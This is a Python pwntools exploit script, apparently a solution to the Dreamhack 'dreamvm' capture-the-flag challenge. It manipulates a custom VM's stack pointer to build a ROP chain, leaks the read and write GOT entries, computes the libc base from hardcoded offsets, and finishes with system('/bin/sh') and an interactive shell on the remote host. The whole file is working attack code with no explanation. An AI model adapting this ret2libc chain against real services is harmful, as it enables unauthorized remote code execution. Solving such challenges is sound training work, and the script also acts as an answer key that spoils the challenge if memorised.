from pwn import *

def slog(name, addr): return success(': '.join([name, hex(addr)]))

p = remote('host3.dreamhack.games', 17743)
e = ELF('./dreamvm')

r = ROP(e)

# ROP chain
pop_rdi                 = r.find_gadget(['pop rdi'])[0]
pop_rsi_r15             = r.find_gadget(['pop rsi'])[0]
pop_rdx_rbx_rbp_r12_r13 = r.find_gadget(['pop rdx'])[0]
ret                     = r.find_gadget(['ret'])[0]

write_got = e.got['write']
read_got = e.got['read']
write_plt = e.plt['write']
main = e.symbols['main']

# make [ value read ] + [ push ] + [ move VM stack pointer ] chain
read_push_move  = b'\x06' + b'\x01' + b'\x04' + p64(0x10)
dummy_1_pass    = b'\x04' + p64(0x8)
dummy_4_pass    = b'\x04' + p64(0x20)

# ========== Stage 1 ==========

# make VM stack pointer to RET + 8
payload = b'\x04' + p64(0x38)

# write(1, read@got, 8)
payload += read_push_move * 4 + dummy_1_pass
payload += read_push_move * 2 + dummy_4_pass
payload += read_push_move

# write(1, write@got, 8)
payload += read_push_move * 4 + dummy_1_pass
payload += read_push_move * 2 + dummy_4_pass
payload += read_push_move

# return to main
payload += read_push_move

slog('payload #1', len(payload))
payload += b'\xFF' * (0x100 - len(payload))

p.send(payload)

# write(1, read@got, 8)
payload = p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(read_got)
payload += p64(pop_rdx_rbx_rbp_r12_r13) + p64(8)
payload += p64(write_plt)

# write(1, write@got, 8)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(write_got)
payload += p64(pop_rdx_rbx_rbp_r12_r13) + p64(8)
payload += p64(write_plt)

# return to main
payload += p64(main)

p.send(payload)

# ========== Stage 2 ==========

read = u64(p.recvn(8))
write = u64(p.recvn(8))
# libc_base = read - libc.symbols['read']
libc_base = read - 0x10e1e0
# system = libc_base + libc.symbols['system']
system = libc_base + 0x52290
# binsh = libc_base + next(libc.search(b'/bin/sh'))
binsh = libc_base + 0x1b45bd

slog('read', read)
slog('write', write)
slog('libc_base', libc_base)
slog('system', system)
slog('/bin/sh', binsh)

payload = b'\x04' + p64(0x38)

payload += read_push_move * 3

payload += b'\xFF' * (0x100 - len(payload))

p.send(payload)

payload = p64(pop_rdi) + p64(binsh)
payload += p64(system)

p.send(payload)

p.interactive()